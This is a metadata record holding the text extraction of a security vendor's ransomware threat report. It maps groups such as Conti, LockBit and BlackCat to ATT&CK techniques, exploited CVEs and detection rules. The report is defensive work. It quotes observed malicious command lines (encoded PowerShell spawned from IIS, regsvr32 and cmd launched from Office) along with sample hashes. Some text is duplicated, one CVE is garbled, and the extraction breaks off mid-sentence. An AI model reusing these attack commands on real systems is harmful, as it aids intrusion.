{
    "id": "0acba24e-5484-43d4-9087-5b673928040f",
    "created_at": "2022-10-25T16:48:18.684494Z",
    "updated_at": "2025-03-27T02:15:37.929431Z",
    "deleted_at": null,
    "sha1_hash": "87c9a5cf75a7afd57108d6dc7a495b3465257b5c",
    "title": "",
    "authors": "",
    "file_creation_date": "2022-06-23T12:25:51Z",
    "file_modification_date": "2022-06-23T12:25:51Z",
    "file_size": 4794005,
    "plain_text": "# Common TTPs of modern ransomware\n\n\n-----\n\n## Foreword\n\nAt the beginning of this report we would like to quote “Intelligence\nDriven Incident Response” by Scott J. Roberts & Rebekah Brown,\n“Intelligence – is the glue that can bind together multiple diverse teams\noperating at different levels with different priorities”. That is precisely\nwhy the Kaspersky Threat Intelligence Team has decided to combine\nthe best practice of all teams in our organisation to create this report.\nThis report uses data from recent investigations by our coworkers\nin the Threat Research team and the Global Emergency Response\nTeam (GERT), and selected research efforts by the Kaspersky Global\nResearch and Analysis Team (GReAT). We also used best practice from\nthe Escal Institute of Advanced Technologies (SANS), the National\nCybersecurity Centers and The National Institute of Standards and\nTechnology (NIST).\n\nWe drew on our statistics to select the most popular groups, analysed\nin detail the attacks they perpetrated and employed techniques\nand tactics described in MITRE ATT&CK to identify a large number\nof shared TTPs. By tracking all the groups and detecting attacks,\nwe see that the core techniques remain the same throughout the\ncyber kill chain. The attack patterns thus revealed are not accidental,\nbecause this class of attack requires the hackers to go through\ncertain stages, such as penetrating the corporate network or victim’s\ncomputer, delivering malware, further discovery, credential access,\ndeleting shadow copies, removing backups, and finally, achieving their\nobjective.\n\n## Who is this report for\n\nThe report is written for SOC analysts, threat hunting teams, cyber\nthreat intelligence analysts, digital forensics specialists or cyber\nsecurity specialists who are involved in the incident response process\nor want to protect their environment from targeted ransomware\nattacks. This report helps to understand how ransomware groups\ngenerally operate and how to defend against such attacks.\n\nYou can refer to the report as a library of knowledge on the main\ntechniques used by ransomware groups, for writing hunting rules, as\nwell as for auditing your security solutions.\n\n\n-----\n\n## Authors and acknowledgments\n\nThis report was made by the Kaspersky Threat Intelligence team who\naggregates and analyzes data about Advanced Persistence Threats\n(APTs) and Crimeware, including ransomware actors. This data comes\nfrom various sources, including team’s own research as well as many\nKaspersky research teams: Kasperksy Global Research and Analysis\nTeam (GReAT), Kaspersky Global Emergency Response Team (GERT),\nKaspersky SOC, Threat Research team and others. Our Threat\nIntelligence Team utilizes best practices and tools, such as the MITRE\nATT&CK Framework to research adversaries’ TTPs, tools, behavior and\nenvironment and to enrich our TI and security solutions.\n\n### • [Nikita Nazarov - Team Lead Threat Intelligence Group]\n • [Vasily Davydov - Lead Threat Intelligence Analyst]\n • [Natalya Shornikova - Senior Threat Intelligence Analyst]\n • [Vladislav Burtsev - Threat Intelligence Analyst]\n • [Danila Nasonov - Junior Threat Intelligence Analyst]\n\nAs the authors of our report, we would like to thank the following\ncolleagues for their help in writing this work:\n\n### • [Fedor Sinitsyn - Lead Malware Analyst ]\n • [Vladimir Kuskov - Head of Threat Exploration]\n • [Kirill Semenov - Head of Defensive Security Services]\n • [Konstantin Sapronov - Head of Global Emergency Response Team]\n • [Dmitry Galov - Senior Security Researcher]\n • [David Emm - Principal Security Researcher]\n • [Jornt van der Wiel - Senior Security Researcher]\n\n## How this report is organised\n\nThe report consists of the following sections:\n\n1. An introduction showing the relevance of the ransomware problem\nand a review of statistics;\n\n2. For the selected groups, a Kill Chain was built and a general scheme\nis presented, where intersections and common elements are visible;\n\n3. A detailed analysis of each technique with examples of how they are\nused by various groups;\n\n4. Section mitigation based on the techniques discussed;\n\n5. An Analysis of victims and conclusions based on the report;\n\n6. Section with an appendix where the main samples of ransomware\ngroups used in the report are provided, and all considered sigma rules\nthat can be used for detection.\n\n\n-----\n\n## Why ransomware is so popular\n\nIn the year 2022, ransomware is among the most formidable threats to\ninformation security in the world. Kaspersky products have detected\nseveral million detections of ransomware over the last six months.\nNew variants, designed to circumvent security measures, appear on a\nregular basis. Ransomware poses a threat both to individual computer\nusers, and huge corporations and organisations. Ransomware encrypts\nuser data and demands a ransom for decrypting it.\n\nThe ransom amount varies greatly depending on whose data got\nencrypted: if the victim is a simple user, the amount will largely be in\nthe range of $500–$1000; if the victim is a company, it could reach\na nine-digit number. Most ransoms are demanded in Bitcoin, but\ndemands for other cryptocurrencies, like Ethereum or Monero, do\noccur. Once the ransom is paid, the adversary will send a key, and the\nvictim can then decrypt their data (if the adversary didn’t lie and your\ndata is not lost forever).\n\nIf your data has been encrypted, it means the fight is lost. The chances\nto get your data decrypted on your own or with the help of a firm\nthat specialises in decryption are slim to zero. Many such companies,\nin fact, buy a decrypter from the attacker and add a markup to the\nransom amount when they charge you for their “services’’. Another\nmotivator to pay is the possibility that the adversary might start\nthreatening to publish your confidential data unless you comply with\ntheir demands. This can lead to large reputational losses, disclosure of\ntrade secrets and other problems associated with data leakage.\n\nKaspersky ensures a high detection rate through comprehensive\nmonitoring and analysis of sample activity; groups’ behaviours,\ntechniques and tactics; and analysis of a huge amount of statistics\nincluding manual review and processing by automated systems that\nhelp to identify anomalies and detect threats. Based on statistics, we\ncan build the next new ransomware families timeline.\n\n\n-----\n\n## Number of new families by year\n\n|Col1|Col2|Col3|Col4|Col5|Col6|Col7|Col8|\n|---|---|---|---|---|---|---|---|\n|PClock|WannaCry|Erebus|PetrWrap|Crypat|Hermes|AecHu||\n|Matrix|Pycl|BTCWare||||||\n|Poster|Ranion|Tiny|Everbe|||||\n|Manna|Ferber|Jaff|Rao|Savant||||\n|Fairy|MacRansom|Erebus|NotPetya|||||\n|Nubi||||||||\n|Magni|Pyrgen|BadRabbit||||||\n|Phobos|Ordin|||||||\n|Clop||||||||\n|GandCrab||||||||\n|WhiteRose|BlackHeart|||||||\n|Ryuk||||||||\n|LimeRat||||||||\n|WannaCash|Scrobo|Dcrtr||||||\n|Stop/DJVU||||||||\n|Anatova|MegaCortex|||||||\n|Vega||||||||\n|JNEC|RobbinHood|||||||\n|JSWorm|Wesker|Maze||||||\n|VoidCrypt||||||||\n|DoppelPaymer||||||||\n|NetWalker||||||||\n|Medusa|Snatch|||||||\n|Thanos|NextCry|WastedLocker||||||\n|Lockbit|PwndLocker|DMR||||||\n|Makop|Bitpylock|||||||\n|RagnarLocker|Conti|Cuba|Sorena|||||\n|TeslaRvng|Blackin|||||||\n|WannaRen|Ransomexx|Sfile||||||\n|Snake||||||||\n|Avaddon|GottaCrypt|||||||\n|EvilQuest|Fonix|||||||\n|Darkside|XmrLocker|||||||\n|MountLocker||||||||\n|Egregor||||||||\n|HelloKitty|CoronaLock|||||||\n|Suncrypt|DeathRansom|Cring|Babuk|Hades||||\n|Lorenz|Pysa|||||||\n|Quoter||||||||\n|Jesus|Qlocker|||||||\n|DiscoRan|Everest|||||||\n|Hive|Zikma|||||||\n|AvosLocker|Scrypt|BlackMatter||||||\n|Loki|LockFile|||||||\n|Chaos|Blackbyte|Colossus||||||\n|Diavol|Prans|||||||\n|Polaris|Rook|Surtr|Sabbath|||||\n|BlackCat||||||||\n|NightSky||||||||\n|Stormous|Krus|Hermetic||||||\n|Freeud|Pandora|||||||\n|||||||||\n\n\nFeb PClock WannaCry Erebus PetrWrap Crypat Hermes AecHu\n\nMar Matrix Pycl BTCWare\n\nApr Poster Ranion Tiny Everbe\n\nMay Manna Ferber Jaff Rao Savant\n\nJun Fairy MacRansom Erebus NotPetya\n\nAug Nubi\n\nOct Magni Pyrgen BadRabbit\n\nNov Phobos Ordin\n\nDec Clop\n\nJan GandCrab\n\nApr WhiteRose BlackHeart\n\nAug Ryuk\n\nSep LimeRat\n\nOct WannaCash Scrobo Dcrtr\n\nNov Stop/DJVU\n\nJan Anatova MegaCortex\n\nFeb Vega\n\nMar JNEC RobbinHood\n\nMay JSWorm Wesker Maze\n\nJun VoidCrypt\n\nJul DoppelPaymer\n\nSep NetWalker\n\nOct Medusa Snatch\n\nNov Thanos NextCry WastedLocker\n\nDec Lockbit PwndLocker DMR\n\nJan Makop Bitpylock\n\nFeb RagnarLocker Conti Cuba Sorena\n\nMar TeslaRvng Blackin\n\nApr WannaRen Ransomexx Sfile\n\nMay Snake\n\nJun Avaddon GottaCrypt\n\nJul EvilQuest Fonix\n\nAug Darkside XmrLocker\n\nSep MountLocker\n\nOct Egregor\n\nNov HelloKitty CoronaLock\n\nDec Suncrypt DeathRansom Cring Babuk Hades\n\nJan Lorenz Pysa\n\nMar Quoter\n\nApr Jesus Qlocker\n\nMay DiscoRan Everest\n\nJun Hive Zikma\n\nJul AvosLocker Scrypt BlackMatter\n\nAug Loki LockFile\n\nSep Chaos Blackbyte Colossus\n\nOct Diavol Prans\n\nNov Polaris Rook Surtr Sabbath\n\nDec BlackCat\n\nJan NightSky\n\nFeb Stormous Krus Hermetic\n\nMar Freeud Pandora\n\n0 1 2 3 4 5 6 7\n\nNumber\n\n\n-----\n\nThe problem receives broad news coverage, as new ransomware\nfamilies have been regularly appearing, but that new ransomware\nis more “targeted” than the old mass-spreading families. Below is a\ndiagram showing the emergence of new ransomware families in the\ntimeline.\n\nYou may notice that at least one new ransomware family has\nappeared per month. Each ransomware family is used by a separate\nattack group. This report looks at techniques and tactics employed\nby these ransomware groups, drawing on preparatory samples, RATs,\nand loaders used for ransomware delivery.\n\n## Background information\n\nRansomware analysis gets a lot of coverage in commercial and public\nreports, with each vendor issuing up to several dozen reports relating\nto ransomware every year. These reports provide analysis that looks\ninto specific families, new variants or individual groups’ activities,\ndissecting the functionality of the malicious file, disassembling and\nreverse-engineering the file; new algorithms and techniques found\nduring the research; and general tips for preventing that functionality\nfrom working, e.g., YARA rules. Although the data gives a better\nunderstanding of a specific malicious file or the family’s features, an\nimportant issue to consider is the purpose of the report. Security\nprofessionals may learn a lot from reports, but little of the content has\nimmediate practical use. The deployment of ransomware is preceded\nby a number of stages, where the group uses RATs and other tools.\nWe will revisit these, showing what groups can achieve by using them\nand how they can be used. The purpose of our report as we see it\nis to explain the tactical path taken by the attacker, to describe the\ndifferent stages to help the reader form a complete picture of the\nattack, to give a visual description of how to defend against this class\nof attack using the most prolific groups as the examples, and to show\nthe SIGMA detection rules created by us, which can be applied to\ninfrastructure as part of your SIEM solutions.\n\n\nis to explain the tactical path taken by the attacker, to describe the\ndifferent stages to help the reader form a complete picture of the\nattack, to give a visual description of how to defend against this class\nof attack using the most prolific groups as the examples, and to show\nthe SIGMA detection rules created by us, which can be applied to\ninfrastructure as part of your SIEM solutions.\n\n## This report in a nutshell:\n\n### • Different groups share more than half of the cyber kill chain, with the core\n###### attack stages executed identically;\n\n### • The Technical Details section of the report draws on samples discovered\n###### while investigating real-life attacks and a large amount of threat statistics;\n\n### • We used the TTPs described to create SIGMA rules that you can use in\n###### your SIEM solutions. Appendix I – Sigma Rules\n\n\n-----\n\n## Cyber Kill Chain\n\nTo highlight the common components of the different attack patterns\nand the TTPs shared by the various ransomware groups’ behaviours,\nwe created a common cyber kill chain diagram. This provides a visual\nrepresentation of the techniques and tactics used by ransomware\noperators and allows us to make predictions as to the threat actor’s\nfurther steps.\n\nWe have selected the eight most common ransomware groups,\nnamely:\n\n#### 1 12 13 14\n\n###### Conti/Ryuk Pysa Clop (TA505) Hive\n\n#### 5 6 7 8\n\n###### Lockbit2.0 RagnarLocker BlackByte BlackCat\n\nOnce the incident data relating to these groups have been collected,\nwe identify the TTPs characteristic of each of them and then\nsuperimpose these on the shared cyber kill chain. The arrows indicate\nthe sequence of specific techniques and the colours mark the\nindividual groups that have been known to deploy these.\nBelow is the resulting diagram.\n\n\n-----\n\nConti/Ryuk\nPysa\nClop (TA505)\nHive\nLockbit 2.0\nRagnarLocker\nBlackByte\nBlackCat\n\nExternal Exploit User Execution:\n\nPhishing\n\nRemote Services Public-Facing Malicious File\n\nT1566\n\nT1133 Application T1190 T1204.002\n\nWindows Command\nManagement and Scripting\nInstrumentation Interpreter\nT1047 T1059\n\nExploitation Abuse Elevation Deobfuscate/ Application\n\nAccess Token\n\nfor Privilege Control Mechanism: Decode Files Layer Protocol:\n\nManipulation\n\nEscalation Bypass User Account or Information Web Protocols\n\nT1134\n\nT1068 Control T1548.002 T1140 T1071.001\n\nCreate or Modify Boot or Logon Scheduled\n\nAccount Autostart Execution:\n\nSystem Process: BITS Jobs Task/Job:\n\nManipulation Registry Run Keys /\n\nWindows Service T1197 Scheduled Task\n\nT1098 Startup Folder\n\nT1543.003 T1547.001 T1053.005\n\nSigned Binary Process Impair\n\nMasquerading\n\nProxy Execution Injection Defenses\n\nT1036.003\n\nT1218 T1055 T1562\n\nFiles Process Remote System Network Share System Network\n\nAccount\n\nand directory Discovery Discovery Discovery Connections\n\nDiscovery T1087\n\ndiscovery T1083 T1057 T1018 T1135 Discovery T1049\n\nCredentials from\n\nOS Credential Password Stores:\n\nBrute Force T1110\n\nDumping T1003 Credentials from Web\n\nBrowsers T1555.003\n\nRemote Services:\n\nRemote Services: Lateral Tool\n\nSMB/Windows\n\nRemote Desktop Transfer\n\nAdmin Shares\n\nProtocol T1021.001 T1570\n\nT1021.002\n\nInhibit System\n\nService Stop Exfiltration Over\n\nRecovery/\n\nT1489 C2 Channel\n\nT1490\n\nIndicator\nRemoval on Host: Data Encrypted Indicator Exfiltration\n\nRemoval on Host: Over Web Service:\n\nClear Windows for Impact\n\nFile Deletion T1486 Exfiltration to Cloud\n\n\n-----\n\n## Technical Details\n\n\nThis is followed by sub-techniques with\ndetails according to MITRE ATT&CK, all\nbased on the example above.\n\nInitial Access\n\n### •\nExecution\n\n### •\nPersistence\n\n### •\nPrivilege Escalation\n\n### •\nDefense Evasion\n\n### •\nCredential Access\n\n### •\nDiscovery\n\n### •\nLateral Movement\n\n### •\nCommand and Control\n\n### •\nExfiltration\n\n### •\nImpact\n\n### •\n\n\nEach of the techniques shown in the previous diagram is mapped to\ngroups and accompanied with a table showing which of the actors\ndiscussed have employed the technique. A detailed description of how\neach technique is used follows. In addition, attached to each technique\nare samples and utility command lines used by the threat actors, and\nnaturally, SIGMA rules that describe ways of detecting the techniques\ndescribed in the report.\n\n\nLateral Movement\n\n### •\nCommand and Control\n\n### •\nExfiltration\n\n### •\nImpact\n\n### •\n\nMITRE ATT&CK TTP\n\nUser Execution: Malicious File T1204.002 -4/8 Number of actors using this TTP\n\nConti\n\nPysa\n\nClop (TA505)\n\nHive Actors using this technique\n\nRagnarLocker\n\nLockbit\n\nBlackByte Not seen\n\nBlackCat\n\nAs we said in the previous chapter the common way \u0003to\ndeliver malicious payload in phishing campaigns \u0003is through\nthe malicious Microsoft documents attached \u0003to emails.\n\nDetailed description of TTP\n\nAdversaries may store malicious documents \u0003in password-\nprotected archive files and attach archive files to phishing\nemails.\n\nImage_path: “$windir\\$system32\\regsvr32.exe”,\nCommand_line: “regsvr32 $user\\$appdata\\Vote1.ocx”,\n\nExecution example\n\nParent_image_path: “$programfiles\\Microsoft Office\\\nOffice14\\Excel.EXE”\n\nSIGMA:\nAppendix#1 - Started windows shell from Trusted process SIGMA rules for detection\nAppendix#1 - Drop Execution File From by Trusted Process\n\n\n-----\n\n## Initial Access\n\nThe most popular techniques for gaining\ninitial access among ransomware groups are:\n\nExternal Remote Services\n\n### •\nExploit Public Facing Applications\n\n### •\nPhishing\n\n### •\n\n\nMost of the ransomware groups we analysed operate as a RaaS\n(Ransomware as a Service). So the infection vector depends on\nthe affiliates involved in the campaign. The prospective victims are\nselected based on being vulnerable to certain exploits, often with\nexternal services and RDP.\n\nThe actors use a compromised RDP to access the system, bruteforce passwords, or exploit some known vulnerabilities. They do not\nomit sending a large volume of phishing emails to employees of an\norganisation to start an infection.\n\n|Col1|Conti|Pysa|Clop (TA505)|Hive|Ragnar Locker|Lockbit|BlackByte|BlackCat|\n|---|---|---|---|---|---|---|---|---|\n|External Remote Services T1133|||||||||\n|Exploit Public- Facing Application T1190|||||||||\n|Phishing T1566|||||||||\n\n\nT1190\n\nPhishing\nT1566\n\n\n-----\n\nExternal Remote Services T1133 - 8/8\n\n### • [Conti]\n • [Pysa]\n • [Clop (TA505)]\n • [Hive]\n • [RagnarLocker]\n • [Lockbit]\n • [BlackByte]\n • [BlackCat]\n\nThe common infection vector is via exposed remote services,\nespecially RDP. Often these services are not sufficiently protected.\nAttackers may use valid accounts, stolen credentials or brute-forcing.\nAccording to the Kaspersky GERT team, often the incident starts with\na successful RDP logon.\n\nMost companies need the ability to let employees logon via RDP to run\ntheir business as usual. However, very often system administrators\ndo not configure RDP securely enough. This leads to detection of RDP\n‘sticking out’ on the Internet and immediate attempts to brute-force\npasswords to default accounts (admin, administrator, root, etc.) by\nattackers or scanning services. Typically, it should be relatively quick\nfor an attacker to find out if a particular organisation has an RDP\nservice open to the Internet.\n\nWe observed that all of the ransomware groups analysed in this report\nused open RDP to gain initial access to the system, as this is the\neasiest vector for initial access.\n\n##### Conclusion\n\nA best practice for protecting against RDP related attacks, is to ‘hide’\nit behind a VPN and properly configure it. It is also very important\nto use strong passwords. Additional measures to reduce the risk of\ncompromise are listed under the **Mitigations section.**\n\n\n-----\n\nExploit Public-Facing Application T1190 - 6/8\n\n### • [Conti]\n • [Pysa]\n • [Clop (TA505)]\n • [Hive]\n • [RagnarLocker]\n • [Lockbit]\n • [BlackByte]\n • [BlackCat]\n\nRansomware affiliates try to find misconfigurations, weaknesses\nand unpatched vulnerabilities in public-facing applications in order\nto gain initial access. Attackers target Microsoft Exchange Servers,\nSharepoint servers, VPN and other web services.\n\nThe most commonly exploited vulnerabilities are ProxyShell\nCVEs: CVE-2021-34473, CVE-2021-34523 and CVE-2021-31207\n\n                       - vulnerabilities in Microsoft Exchange that could allow a remote\nattacker to execute arbitrary code on a vulnerable server. Attackers\nremotely exploit ProxyShell through a Client Access Service (CAS)\nrunning on port 443 on Internet Information Services (IIS). These\nvulnerabilities affect Exchange 2013 CU23 versions prior to 15.0.1497.15,\nExchange 2016 CU19 versions prior to 15.1.2176.12, Exchange 2016 CU20\nversions prior to 15.1.2242.5, Exchange 2019 CU8 versions prior to\n15.2.792.13, and Exchange 2019 CU9 versions prior to 15.9.2. The issue\nin the PowerShell service occurs because the access token is not\nproperly validated before executing Exchange PowerShell commands.\nAn attacker could use this in combination with other vulnerabilities to\nexecute arbitrary code on a system.\n\n### • [CVE-2021-34473, CVE-2021-34523: Path Confusion without ]\nauthentication leading to ACL bypass (fixed April 2021 in\nKB5001779)\n\n### • [CVE-2021-31207: writing arbitrary files after authentication, ]\nleading to remote code execution (fixed in May 2021 in\nKB5003435). This vulnerability affects various versions\nof Exchange (2013 CU23 up to 15.0.1497.15, 2016 CU19 up to\n15.1.2176.12, 2016 CU20 up to 15.1.2242.5, 2019 CU8 up to 15.2.792.13,\nand 2019 CU9 up to 15.2.858.9). Writing a file results in remote\ncode execution. The attackers use the PowerShell cmdlets New-\nManagementRoleAssignment to get the mailbox import/export\nrole and New-MailboxExportRequest to export the mailbox to a\nweb server folder\n\n\n-----\n\naffiliates.\n\n**BlackCat CVE-2021-31207 exploitation example:**\n```\n                    Image _ path: $windir\\$system32\\WindowsPowerShell\\v1.0\\\n                    powershell.exe\n                    Command _ line: $windir\\$system32\\WindowsPowerShell\\\n                    v1.0\\powershell.exe -nop -exec bypass -EncodedCommand\n                    <base64>\n                    Parent _ image _ path: $windir\\$system32\\inetsrv\\w3wp.exe\n\n```\nBased on the threat actor’s advertisement in the darknet, “Looking\nfor WINDOWS/LINUX/ESXI pentesters”, BlackCat also is supposed\nto exploits other common vulnerabilities of such exposed services as\nVPN, RDP, Web-services\n\n**LockBit exploits Fortinet VPN CVE-2018-13379**\n\n### • [A directory traversal vulnerability that allows an unauthorised ]\nuser to access system files by sending a specially configured HTTP\nrequest. The exploit allows access to the sslvpn_websession files\non the Fortinet FortiOS VPN and steal credentials, which can then\nbe used to compromise the corporate network by, for example,\ndeploying ransomware on it.\n**Clop (TA505):**\n\nCVE-2021-27101, CVE-2021-27102, CVE-2021-27103, CVE-2021-27104,\nCVE-2021-35211\n\n### • [CVE-2021-2710 – Vulnerability in the Oracle Banking Payments ]\nproduct of Oracle Financial Services Applications (component:\nCore). Supported versions that are affected are 14.1.0-14.3.0. The\neasily exploitable vulnerability allows low privileged attackers\nwith network access via HTTP to compromise Oracle Banking\nPayments. Successful attacks of this vulnerability can result in\nunauthorised update, the insertion or deletion of access to some\nof Oracle Banking Payments. Data is accessible; unauthorised read\naccess to a subset of Oracle Banking Payments is also possible.\n\n### • [CVE-2021-27102 - FTA vulnerability resulting in the execution of ]\noperating system commands through a call to a local web service.\n\n### • [CVE-2021-27103 - SSRF FTA vulnerability is operated through the ]\ncreated post-call to the final point.\n\n### • [CVE-2021-27104 - The vulnerability of the FTA as a result of ]\nthe operation of which the command of the operating system is\nperformed through the created post-call to various end points of\nthe administrator.\n\n### • [CVE-2021-35211 - A Serv-U SSH Server pre-authentication ]\nremote code execution vulnerability that can be easily and\nsecurely exploited in a default configuration. An attacker could\nexploit this vulnerability by connecting to an open SSH port and\nsending a malformed connection request before authentication. If\nsuccessfully exploited, the vulnerability could allow an attacker to\ninstall or run programs, which is used in targeted attacks.\n\n\n-----\n\nabove - CVE-2018-13379 and CVE-2018-13374\n\n### • [CVE-2018-13374 - as a result of the vulnerability, administrators ]\nwith Fortigate and Fortiadc read only access can send a request\nto check the connection to the LDAP server for the LDAP fake\nserver instead of the customary account to enter the LDAP server\nconfigured to Fortigate.\n\n##### Conclusion\n\nAdversaries may exploit many vulnerabilities to gain initial access to\ninfrastructure. In this case, a well-designed vulnerability management\nprocess can help to overcome this problem. See “Mitigations” for\nmore details. Unfortunately, not all vulnerabilities found are published\nby the major vendors in time. There are a large number of unknown\nvulnerabilities known as “zero days”. To increase the chances of\ndetecting the enemy, you can monitor various anomalies in the\noperation of front-facing applications:\n\n### • [Web process spawns a shell;]\n • [Anomaly parent/child process in web process;]\n • [Anomaly file creation like .aspx on ProxyShell exploitation;]\n • [Anomaly suspicious arguments in web process;]\n • [Anomaly network connection from web process;]\n\n**SIGMA:**\n\n**Appendix#1 - Windows Shell Start by Web Applications**\n\n\n-----\n\nPhishing T1566 - 4/8\n\n### • [Conti]\n • [Pysa]\n • [Clop (TA505)]\n • [Hive]\n • [RagnarLocker]\n • [Lockbit]\n • [BlackByte]\n • [BlackCat]\n\nAll emails or attachments we detected were attributed to Conti, Clop\n(TA505), Hive or RagnarLocker. In general they used the Phishing:\nSpearphishing Attachment T1566.001 technique.\n\nThere are many options for attachments, such as Microsoft Office\ndocuments, executable files, PDF files, or archive files. Once\nthe attachment is opened, the adversary’s payload exploits the\nvulnerability or directly executes on the user’s system. The text of\nthe email usually tries to give a plausible reason why the file should be\nopened, and may explain how to bypass system protections to do so.\n\n**Conti, Clop (TA505), sends classic phishing emails with a malicious**\nattachment, in an attempt to gain access to the victim’s systems.\nMostly these are doc. or .xlsx documents with scripts embedded\ninside, asking the user to click “Enable Content”.\n\nFig. 2 — Phishing document example\n\n\n-----\n\nuncommon malicious .xlsx files exploiting CVE-2018-0802. Using CVE-\n2018-0802, an attacker exploits a patch bypass vulnerability for CVE-\n2017-11882 to run a shellcode located in the “Equation Native” stream\nof an OLE object.\n\nFig. 3 — Phishing email example\n\nFig. 3 — Phishing email example\n\n**Hive used a more interesting technique. They used social engineering**\ntechniques to get a user to download a malicious attachment from\nTelegram and then run it on their computer. More details in User\n**Execution: Malicious File T1204.002.**\n\n##### Conclusion\n\nRansomware groups widely use the Phishing: Spearphishing\n**Attachment T1566.001 technique, which is closely related to the**\nuser’s actions of launching malicious attachments User Execution:\n**Malicious File T1204.00. For further information on how malicious**\nattachments are usually executed and SIGMA rules relating to this,\n\n\n-----\n\n## Execution\n\n\nAfter groups receive initial access, they need to run malicious code.\nExecution of malicious code consists of techniques that result in\nadversary-controlled code running on a local or remote system.\nAccording to our observations, the mentioned ransomware groups\nprefer three basic techniques as part of these tactics:\n\n1. User Execution: Malicious File T1204.002\n\n2. Command and Scripting Interpreter T1059\n\n### • [PowerShell T1059.001]\n • [Windows Command Shell T1059.003]\n • [JavaScript T1059.007]\n\n3. Windows Management Instrumentation T1047\n\nSince the Execution tactic in ATT&CK Matrix consists of techniques\nthat are to execute malicious actions and relate to all other tactics, we\nwill describe them in more detail.\n\n|Col1|Conti|Pysa|Clop (TA505)|Hive|Ragnar Locker|Lockbit|BlackByte|BlackCat|\n|---|---|---|---|---|---|---|---|---|\n|User Execution: Malicious File T1204.002|||||||||\n|Command and Scripting Interpreter T1059|||||||||\n|Windows Management Instrumenta- tion T1047|||||||||\n\n\nClop Ragnar\nConti Pysa Hive Lockbit BlackByte BlackCat\n(TA505) Locker\n\nUser\nExecution:\nMalicious File\nT1204.002\n\nCommand\nand Scripting\nInterpreter\nT1059\n\nWindows\nManagement\nInstrumenta-\ntion T1047\n\n\n-----\n\nUser Execution: Malicious File T1204.002 - 4/8\n\n### • [Conti]\n • [Pysa]\n • [Clop (TA505)]\n • [Hive]\n • [RagnarLocker]\n • [Lockbit]\n • [BlackByte]\n • [BlackCat]\n\nAs we said in the previous chapter, the most common way to deliver\nmalicious payloads is via phishing campaigns using malicious Microsoft\ndocuments attached to emails. Adversaries may store malicious\ndocuments in password-protected archive files and attach archive\nfiles to phishing emails. A typical malicious document contains a macro\nthat a user can execute by opening the document and allowing the\nmacro to run.\n\nMalicious actors use different Windows shell commands to execute\nmalicious scripts and bypass application control solutions that do not\naccount for the malicious use of the Windows utility.\n\n**Conti uses a classic technique, in which an embedded malicious**\ndocument typically spawns a Windows shell when executed:\n\nFig. 5 — Suspicious Activity: Conti. Malicious document spawns a shell\n```\n                    Image _ path: $windir\\\\$system32\\\\cmd.exe\n                    Command _ line: cmd /c c:\\\\users\\\\public\\\\compareForFor.\n                    hta\n\n```\nParent _ image _ path: $programfiles\\\\Microsoft Office\\\\\nOffice14\\\\WINWORD.EXE\n\n\n-----\n\nTrojan.DLL File Download:\n\nFig. 6 — Suspicious Activity: Conti. Regsvr32.exe from Excel\n```\n                    Image _ path: “$windir\\$system32\\regsvr32.exe”,\n                    Command _ line: “regsvr32 $user\\$appdata\\Vote1.ocx”,\n\n```\nParent _ image _ path: “$programfiles\\Microsoft Office\\\nOffice14\\Excel.EXE”\n\nAccording to the Kaspersky GERT team’s investigation into the Hive\ngroup, they deliver payloads via another communication channel.\nTheir victims downloaded an archive “C:\\Users\\<xxx>\\Downloads\\\nTelegram Desktop\\wana_setup.zip” from Telegram Messenger using\nthe Telegram Desktop client. This archive contains the executable file\nwana_setup.exe (MD5: C0641560B2A4E62DEBAC75F8BFE91098). The\nfile was executed by the user. This file is a Trojan known as “RedLine\nStealer”.\n\nThere are several suspicious files created on the system after\nexecution of this file:\n\n### • [C:\\Windows\\System32\\ShellExperiences\\Windows Host.xml]\n • [C:\\Users\\<xxx>\\AppData\\Roaming\\Microsoft\\Windows\\Windows ]\nHost.exe\n\n### • [C:\\Windows\\System32\\Tasks\\Windows Host]\n • [C:\\Users\\<xxx>\\AppData\\Local\\Microsoft\\Windows\\Fonts\\]\nCourie-BoldItalic.ttf\n\n### • [C:\\Users\\<xxx>\\AppData\\Roaming\\Microsoft\\Windows\\]\nTemplates\\VideoDefault.txt\n\n### • [C:\\Users\\<xxx>\\AppData\\Roaming\\Microsoft\\Windows\\]\nPowerShell\\System Update.exe\n\n### • [C:\\Users\\<xxx>\\AppData\\Roaming\\Microsoft\\Windows\\]\nPowerShell\\pw.System.ps1\n\nAfter stealing information, the wana_setup.exe file downloads and\nexecutes the “Windows Host.exe”. This file installs a cryptocurrency\nmining tool.\n\n\n-----\n\nexecution:\n\n1. The email contains an HTML attachment that redirects the victim to\na compromised site to download an XLS document. The emails were\nsent from hacked email accounts of various companies. Some emails\nuse signature blocks from previous victims, presumably to make the\nemails appear more legitimate. Here is an example of one of the HTML\nattachments:\n\nFig. 7 — Suspicious HTML\n\nAfter clicking on the link, the user downloads the.xls document, which\nwill then download SDBbot (a Remote Access Trojan).\n\n2. Classic .docx documents with two .dlls inside: stGui1.dll, stGui2.dll.\nInside the document a macro is used, the purpose of which is to run\none of these libraries. One library is used for 32-bit systems, the other\none for 64-bit systems. Both .dlls are downloaders belonging to the\nFRIENDSPEAK malware family (Get2, GetandGo).\n\nFig. 6 — Suspicious Activity: Conti. Regsvr32.exe from Excel\n\n\n-----\n\n##### Conclusion\n\nIn this technique adversaries use human factors. Malicious payloads\nin Microsoft Office documents are not launched until a user clicks on\nit and allows editing. Organisations should regularly carry out user\nawareness training in order to reduce the chances of successful\nphishing campaigns.\n\nThe main patterns of the User Execution: Malicious File T1204.002\ntechnique will be following activity of trusted processes such as\nMicrosoft Office applications, PDF reader applications (acrobat.exe,\nAcroRd32.exe) and other text editor applications (notepad.exe):\n\n### • [Running Windows shell;]\n • [Dropping executable files or scripts;]\n • [Loading suspicious libraries;]\n • [Network connection to IoCs (IP, URL, Domain);]\n\n**SIGMA:**\n\n**Appendix#1 - Started windows shell from Trusted process**\n\n**Appendix#1 - Drop Execution File From by Trusted Process**\n\n\n-----\n\nCommand and Scripting Interpreter T1059 - 8/8\n\n### • [Conti]\n • [Pysa]\n • [Clop (TA505)]\n • [Hive]\n • [RagnarLocker]\n • [Lockbit]\n • [BlackByte]\n • [BlackCat]\n\nWhile observing the behaviour of ransomware groups, we concluded\nthat they all use the Command and Scripting Interpreter for different\npurposes. Adversaries know that cmd.exe works on any machine\nbecause the Windows Command Shell is a low-cost, all-in-one tool in an\nadversary’s arsenal. It may not do much on its own, but it is capable of\ncalling almost any executable in the system to accomplish its mission.\n\nSince the Windows Command Shell is ubiquitous in all versions of\nWindows, this technique overlaps greatly with other techniques. This is\nwhy we decided to describe it in detail in a concise technique.\n\nThreat actors actively use the PowerShell interpreter to execute\ntheir payloads and operate on victim’s systems. Many of the analysed\nransomware actors use offensive tools based on 